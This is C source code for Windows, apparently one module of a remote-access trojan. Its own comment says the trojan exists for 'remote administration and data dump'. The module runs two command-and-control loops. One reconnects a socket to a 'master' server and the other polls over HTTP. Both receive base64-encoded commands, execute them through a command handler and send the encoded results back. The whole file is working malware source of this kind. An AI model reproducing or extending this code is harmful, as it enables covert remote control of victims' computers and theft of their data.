#include <Windows.h>
#include <strsafe.h>
#include <WinInet.h>
#include "http.h"
#include "sock.h"
#include "base64.h"
#include "command.h"
#include "misc.h"
#include "cc_monitor.h"



/**
 * @brief Comunication to master via socket
 * @returns never return
 */
DWORD WINAPI __monitor_socket(LPVOID lParam) {
	unsigned long decoded_len, encoded_len;
	cmd_data data = {0};
	SOCKET sock;

	unsigned char *buff = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_COMMAND_LEN);
	unsigned char *decoded_buff = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_COMMAND_LEN);
	char *encoded_output = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_ENCODED_REPLY_LEN);


	if((data.cmd = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_COMMAND_LEN))==NULL) {
		return(0xFFFFFFFF);
	}
	if((data.arg = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_ARGUMENT_LEN))==NULL) {
		return(0xFFFFFFFF);
	}

	if((data.token = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_TOKEN_LEN))==NULL) {
		return(0xFFFFFFFF);
	} 

	if((data.reply = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_REPLY_LEN))==NULL) {
		return(0xFFFFFFFF);
	} 

	while(!(sock=__socket_cc_open()))
		 Sleep(2000);

	while(sock!=INVALID_SOCKET && sock!=0) {	// socket control main loop
		if(__socket_cc_recv(sock, buff, MAX_COMMAND_LEN)==-1) { // not found
			__socket_cc_close(sock);
			
			while(!(sock = __socket_cc_open()))
				Sleep(2000);

		}
		else { // found
			__trim(buff);
			if(lstrlenA(buff)) {
				if(__base64_decode(buff, lstrlenA(buff), decoded_buff)==1) {
					if(__command_parser(decoded_buff, &data)==0) {
						if(__command_control(&data)==1) {
							if(lstrlenA(data.reply)) {
								if(__base64_encode(data.reply, lstrlenA(data.reply), encoded_output)>=1) {
									while(!__socket_cc_send(sock, encoded_output)) {
										__socket_cc_close(sock);

										while(!(sock = __socket_cc_open())) 
											Sleep(2000);
									}
								}
							}
						}
					}
				}
			}
		}


		encoded_len=0;
		decoded_len=0;
		ZeroMemory(data.arg,MAX_ARGUMENT_LEN);
		ZeroMemory(data.cmd,MAX_COMMAND_LEN);
		ZeroMemory(data.reply,MAX_REPLY_LEN);
		ZeroMemory(data.token,MAX_TOKEN_LEN);
		ZeroMemory(encoded_output, MAX_ENCODED_REPLY_LEN);
		ZeroMemory(decoded_buff, MAX_COMMAND_LEN);
		ZeroMemory(buff, MAX_COMMAND_LEN);
		
	} // END OF LOOP

	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, encoded_output);
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, decoded_buff);
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, buff);
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, data.arg);
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, data.cmd);
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, data.reply);
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, data.token);
	
	__socket_cc_close(sock);
	return 0x4a1AB;
}




/**
 * @brief Comunication to master via http
 * @returns never return
 */
DWORD WINAPI __monitor_http(LPVOID lParam) {
	cmd_data data;

	HINTERNET hRequest;
	unsigned char *reply,*decoded_reply,*encoded_reply;
	char *get_data;
	unsigned char *encoded_token;
	DWORD replylen;
	int i = 0;	


	

	//if ((hRequest = __http_connect()) == NULL) // change for while in release
	//	return(0xFFFFFFFF);

		/*********************** MAIN LOOP ****************************/
	if((data.cmd = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_COMMAND_LEN))==NULL)
		return(0xFFFFFFFF);
	if((data.arg = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_ARGUMENT_LEN))==NULL)
		return(0xFFFFFFFF);
	if((data.token = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_TOKEN_LEN))==NULL)
		return(0xFFFFFFFF);
	if((data.reply = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_REPLY_LEN))==NULL) 
		return(0xFFFFFFFF);
	if((get_data = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_REPLY_LEN))==NULL)
		return(0xFFFFFFFF);
	if((reply = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_REPLY_LEN))==NULL)
		return(0xFFFFFFFF);
	if((decoded_reply = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_DECODED_REPLY_LEN))==NULL) 
		return(0xFFFFFFFF);
	if((encoded_reply = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_DECODED_REPLY_LEN))==NULL)
		return(0xFFFFFFFF);


	while(1) { // The trojan purposes is remote administration and data dump its main function loop comunication over HTTP/HTTPS or SOCKET

		if(__http_make_get(get_data,"0", "\x4a\x4a\x4a\x4a", "\x4a\x4a\x4a\x4a")>=0) { //two last arguments (padding)
			if(__http_read(get_data,(char *)reply)>=2) {
				//__realign_array_left((char *)reply);
				//__trim(reply);
				if(__base64_decode((const char *)reply, lstrlenA((char *)reply), decoded_reply)==1) {
					if(__command_parser(decoded_reply, &data)==0) {
						if(__command_control(&data)==1) {
							if(__base64_encode(data.reply,lstrlenA(data.reply), (char *)encoded_reply)==1) {
								ZeroMemory(get_data, lstrlenA(get_data));
								if(__http_make_get(get_data, "1", (char *)encoded_reply, (char *)0)>=0) {
									ZeroMemory(reply, MAX_REPLY_LEN);
									replylen=0;
									__http_reply(get_data, (char *)reply);
								}
							}
						}
					}
				}
			}
		}


		/*
			I like kill you...
		*/
		ZeroMemory(data.cmd, MAX_COMMAND_LEN);
		ZeroMemory(data.arg, MAX_ARGUMENT_LEN);
		ZeroMemory(data.reply, MAX_REPLY_LEN);
		ZeroMemory(reply, MAX_REPLY_LEN);
		ZeroMemory(decoded_reply, MAX_DECODED_REPLY_LEN);
		ZeroMemory(get_data, MAX_REPLY_LEN);
		ZeroMemory(encoded_reply, MAX_REPLY_LEN);
		Sleep(6); // real is 60000

	} //fucking main while

//END
		
	ZeroMemory(data.cmd, MAX_COMMAND_LEN);
	ZeroMemory(data.arg, MAX_ARGUMENT_LEN);
	ZeroMemory(data.reply, MAX_REPLY_LEN);
	ZeroMemory(reply, MAX_REPLY_LEN);
	ZeroMemory(get_data, MAX_REPLY_LEN);
	ZeroMemory(decoded_reply, MAX_DECODED_REPLY_LEN);

	
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, data.cmd);
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, data.arg);
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, data.token);
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, data.reply);
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, reply);
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, get_data);
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, decoded_reply);
	

}
